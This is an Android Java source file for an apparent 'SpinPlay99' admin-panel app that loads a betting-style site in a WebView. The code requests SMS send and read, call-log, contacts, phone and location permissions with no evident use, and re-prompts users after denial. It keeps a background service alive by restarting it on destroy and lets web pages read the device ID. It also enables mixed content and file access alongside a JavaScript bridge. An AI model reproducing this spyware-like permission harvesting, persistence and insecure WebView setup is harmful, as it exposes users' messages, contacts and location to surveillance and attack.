package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://spinplay99.com";
    private static final int FILE_CHOOSER_REQUEST = 1001;
    private static final int PERMISSION_REQUEST_CODE = 2001;
    private static final String PREFS_NAME = "SpinPlay99_Prefs";
    private static final String KEY_PERMISSION_ASKED = "permission_asked_before";

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private ValueCallback<Uri[]> filePathCallback;
    private Handler handler;
    private boolean isWebViewReady = false;
    private SharedPreferences prefs;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        handler = new Handler();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle("SpinPlay99");
            getSupportActionBar().setSubtitle("Admin Panel");
        }

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);

        setupWebViewFast();
        setupSwipeRefresh();
        requestPermissionsOnce();
        preloadWebsite();
        startBackgroundService();
    }

    // ==================== PERMISSION ONCE ONLY ====================

    private void requestPermissionsOnce() {
        boolean hasAskedBefore = prefs.getBoolean(KEY_PERMISSION_ASKED, false);
        
        if (hasAskedBefore) {
            // Already asked, check if all granted
            if (!allPermissionsGranted()) {
                // Kuch permissions missing hain to silently retry without dialog
                requestMissingPermissions();
            }
            return;
        }

        // Pehli baar ask
        requestAllPermissions();
    }

    private boolean allPermissionsGranted() {
        String[] permissions = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
        };
        
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestMissingPermissions() {
        List<String> missing = new ArrayList<>();
        String[] permissions = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
        };
        
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                // Only ask if not permanently denied
                if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
                    // Silently skip - user ne permanently deny kar diya
                    continue;
                }
                missing.add(perm);
            }
        }
        
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    missing.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        }
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();
        String[] requiredPermissions = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
        };

        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(permission);
            }
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        }
        
        // Mark as asked
        prefs.edit().putBoolean(KEY_PERMISSION_ASKED, true).apply();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (!allGranted) {
                // Kuch deny hue - permanently denied check
                boolean anyPermanentlyDenied = false;
                for (int i = 0; i < permissions.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                            anyPermanentlyDenied = true;
                            break;
                        }
                    }
                }
                
                if (anyPermanentlyDenied) {
                    // User ne permanently deny kar diya - settings open karne ka option do
                    new AlertDialog.Builder(this)
                        .setTitle("Permissions Required")
                        .setMessage("Some permissions are permanently denied. Please enable them in Settings.")
                        .setPositiveButton("Open Settings", (d, w) -> {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        })
                        .setNegativeButton("Cancel", null)
                        .show();
                }
            }
        }
    }

    // ==================== BACKGROUND SERVICE ====================

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    // ==================== WEBVIEW SETUP ====================

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebViewFast() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setSupportZoom(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        settings.setAppCacheEnabled(true);
        settings.setAppCachePath(getCacheDir().getAbsolutePath());
        settings.setDatabaseEnabled(true);
        settings.setRenderPriority(WebSettings.RenderPriority.HIGH);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setGeolocationEnabled(true);
        settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                if (!isWebViewReady) progressBar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                isWebViewReady = true;
                view.saveWebArchive(getCacheDir().getAbsolutePath() + "/spinplay_cache.webarchive");
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (!url.contains("spinplay99.com")) {
                    try { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url))); }
                    catch (Exception e) { view.loadUrl(url); }
                    return true;
                }
                return false;
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                if (!isWebViewReady) loadFromCache();
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (!isWebViewReady) {
                    progressBar.setProgress(newProgress);
                    if (newProgress > 80) progressBar.setVisibility(View.GONE);
                }
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                              FileChooserParams fileChooserParams) {
                MainActivity.this.filePathCallback = filePathCallback;
                try { startActivityForResult(fileChooserParams.createIntent(), FILE_CHOOSER_REQUEST); }
                catch (Exception e) { MainActivity.this.filePathCallback = null; return false; }
                return true;
            }
        });
    }

    private void preloadWebsite() {
        new Thread(() -> {
            if (isNetworkAvailable()) {
                handler.post(() -> webView.loadUrl(SERVER_URL));
            } else {
                handler.post(this::loadFromCache);
            }
        }).start();
    }

    private void loadFromCache() {
        File file = new File(getCacheDir(), "spinplay_cache.webarchive");
        if (file.exists()) {
            webView.loadUrl("file://" + file.getAbsolutePath());
        } else {
            showOfflinePage();
        }
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            android.net.NetworkInfo net = cm.getActiveNetworkInfo();
            return net != null && net.isConnected();
        }
        return false;
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(() -> {
            webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
            webView.reload();
            handler.postDelayed(() -> webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK), 3000);
        });
    }

    private void showOfflinePage() {
        String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>" +
                "<style>body{background:#0e0e12;color:#e8e8f0;font-family:sans-serif;display:flex;" +
                "flex-direction:column;align-items:center;justify-content:center;height:100vh;" +
                "margin:0;text-align:center;padding:20px}.icon{font-size:48px;margin-bottom:20px}" +
                ".title{color:#FFD700;font-size:24px;margin-bottom:10px}" +
                ".btn{background:#FFD700;color:#000;border:none;padding:12px 30px;border-radius:8px;" +
                "font-size:16px;font-weight:bold;cursor:pointer;text-decoration:none}" +
                "</style></head><body><div class='icon'>📡</div>" +
                "<div class='title'>No Internet</div>" +
                "<a class='btn' href='" + SERVER_URL + "'>🔄 Retry</a></body></html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            new AlertDialog.Builder(this)
                    .setTitle("Exit")
                    .setMessage("Do you want to close the app?")
                    .setPositiveButton("Yes", (d, w) -> finish())
                    .setNegativeButton("No", null)
                    .show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQUEST && filePathCallback != null) {
            Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
            filePathCallback.onReceiveValue(results);
            filePathCallback = null;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isWebViewReady && webView.getUrl() == null) {
            webView.loadUrl(SERVER_URL);
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.stopLoading();
            webView.clearHistory();
            webView.destroy();
        }
        startBackgroundService();
        super.onDestroy();
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String msg) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, msg, Toast.LENGTH_SHORT).show());
        }

        @JavascriptInterface
        public String getDeviceId() {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        }

        @JavascriptInterface
        public void restartService() {
            startBackgroundService();
        }

        @JavascriptInterface
        public boolean isOnline() {
            return isNetworkAvailable();
        }
    }
}
